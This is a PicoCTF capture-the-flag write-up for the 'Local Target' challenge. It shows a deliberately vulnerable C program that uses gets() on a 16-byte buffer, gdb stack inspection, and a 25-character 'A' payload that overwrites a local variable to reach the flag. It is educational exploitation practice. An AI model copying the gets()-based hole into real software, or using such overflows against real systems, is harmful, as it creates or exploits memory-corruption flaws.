# PicoCTF - Local Target

## Challenge Overview
**Title:** Local Target  
**Category:** Binary Exploitation  
**Difficulty:** Medium  
**Files Provided:** local-target.c, local-target

## Description
Smash the stack Can you overflow the buffer and modify the other local variable? The program is available here. You can view source here. And connect with it using: nc saturn.picoctf.net 57353

## Source Code
```c
#include <stdio.h>
#include <stdlib.h>



int main(){
  FILE *fptr;
  char c;

  char input[16];
  int num = 64;
  
  printf("Enter a string: ");
  fflush(stdout);
  gets(input);
  printf("\n");
  
  printf("num is %d\n", num);
  fflush(stdout);
  
  if( num == 65 ){
    printf("You win!\n");
    fflush(stdout);
    // Open file
    fptr = fopen("flag.txt", "r");
    if (fptr == NULL)
    {
        printf("Cannot open file.\n");
        fflush(stdout);
        exit(0);
    }

    // Read contents from file
    c = fgetc(fptr);
    while (c != EOF)
    {
        printf ("%c", c);
        c = fgetc(fptr);
    }
    fflush(stdout);

    printf("\n");
    fflush(stdout);
    fclose(fptr);
    exit(0);
  }
  
  printf("Bye!\n");
  fflush(stdout);
}
```

## Analysis
From the description, we want to overflow a stack buffer and alter a local variable's value.

The buffer we will overflow is `input`
```c
char input[16];
...
printf("Enter a string: ");
fflush(stdout);
gets(input);
```
`gets()` doesn't guard buffers from overflow, leaving the program vulnerable to stack smashing

We see `num` defined below `input` and initialized with the value `64`.  
A few lines below it, we see it being checked with the value `65`.  
So we want to overflow it and change it to 65.

To construct the payload I will use `gdb` to observe the stack
```
(gdb) b *0x40127a
Breakpoint 1 at 0x40127a
(gdb) r
Starting program: /home/giorgos/Downloads/local-target 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Enter a string: AAAAAAA

Breakpoint 1, 0x000000000040127a in main ()
(gdb) x/32x $rbp - 32
0x7fffffffdb90:	0x41414141	0x00414141	0xf7fe5af0	0x00007fff
0x7fffffffdba0:	0xffffdc90	0x00007fff	0x00000040
```
Our input starts at `0x7fffffffdb90`.  
`num` is stored at `0x7fffffffdba8`.  
So we need 24 'A's to reach `num`.  
`num` currently is `64` or `0x40` so we want to make it `0x41` which happens to be `A`.  
So our final payload is `25*A`.

## Solution

- Find address input starts in stack
- Find address `num` is stored
- Overflow until `num` and change with its value incremented by one

### Execution Example:
```
$ nc saturn.picoctf.net 57353
Enter a string: AAAAAAAAAAAAAAAAAAAAAAAAA

num is 65
You win!
picoCTF{____REDACTED____}
```

## Tools Used
- `gdb`